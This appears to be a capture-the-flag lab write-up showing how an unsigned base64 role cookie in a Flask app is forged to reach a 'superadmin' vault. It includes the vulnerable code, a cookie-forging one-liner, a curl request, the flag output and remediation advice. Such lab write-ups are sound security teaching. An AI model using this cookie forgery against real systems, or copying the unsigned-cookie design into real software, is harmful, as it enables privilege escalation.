# PoC 4 — Broken Authorization (forged `superadmin` role cookie)

**Flag:** `FLAG{authz_7b010b5a5bf9}`

## Vulnerability

The app's session is a single cookie, `auth`, containing
`base64("<username>:<role>")`, with **no signature or server-side
verification**:

```python
def set_auth(resp, username, role):
    token = base64.b64encode(("%s:%s" % (username, role)).encode()).decode()
    resp.set_cookie("auth", token)

def current_user():
    token = request.cookies.get("auth")
    ...
    username, role = base64.b64decode(token).decode().split(":", 1)
    return {"username": username, "role": role}
```

`/vault` trusts `role` from this cookie verbatim:

```python
if user.get("role") != "superadmin":
    return render_template("vault.html", user=user, flag=None), 403
```

No login flow ever issues `role=superadmin` — but nothing stops a client
from writing that value itself, since the cookie is neither signed nor
encrypted (just base64, which is encoding, not protection).

## Exploit

Logging in normally as `alice` yields cookie `auth=YWxpY2U6dXNlcg==`,
which decodes to `alice:user`. Rather than using that cookie, a new
cookie value was crafted directly:

```bash
python3 -c "import base64; print(base64.b64encode(b'alice:superadmin').decode())"
# YWxpY2U6c3VwZXJhZG1pbg==
```

Sending that forged cookie straight to `/vault`, with no prior
"superadmin" login (because no such login exists):

```bash
curl -s -i --cookie "auth=YWxpY2U6c3VwZXJhZG1pbg==" http://127.0.0.1:5000/vault
```

**Response body:**

```html
<h1>The Vault</h1>
<p>Access granted, superadmin.</p>
<p class="note">FLAG{authz_7b010b5a5bf9}</p>
```

## Remediation

Never let the client set its own authorization level. Use a
server-side session store (or a signed/encrypted token such as a
properly verified JWT or Flask's signed session cookie) where the role is
looked up from the database by a server-issued, unguessable session ID —
never trusted verbatim from client-supplied data.

**Severity:** Critical — trivial privilege escalation from any
authenticated (or even just correctly-shaped) cookie to the highest
privilege level in the app.
